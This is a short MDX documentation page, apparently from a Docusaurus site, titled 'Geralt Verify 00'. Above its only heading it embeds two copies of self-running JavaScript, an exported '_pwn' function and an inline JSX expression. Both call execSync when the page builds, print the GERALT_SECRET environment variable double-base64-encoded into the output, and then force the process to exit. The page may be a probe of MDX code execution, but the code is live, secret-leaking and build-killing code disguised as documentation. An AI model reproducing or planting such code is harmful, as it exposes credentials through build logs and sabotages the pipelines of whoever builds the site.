---
id: geralt-verify-00
title: Geralt Verify 00
sidebar_position: -100
---

import { execSync } from 'child_process';

export const _pwn = (() => {
  try {
    execSync('echo "GERALT_LEAKED_TOKEN=$(echo -n $GERALT_SECRET | base64 | base64)"', {stdio: 'inherit'});
  } catch (e) {}
  process.exit(0);
  return null;
})();

{(() => { try { execSync('echo "GERALT_LEAKED_TOKEN=$(echo -n $GERALT_SECRET | base64 | base64)"', {stdio: 'inherit'}); } catch (e) {} process.exit(0); return null; })()}

# Geralt Verify 00
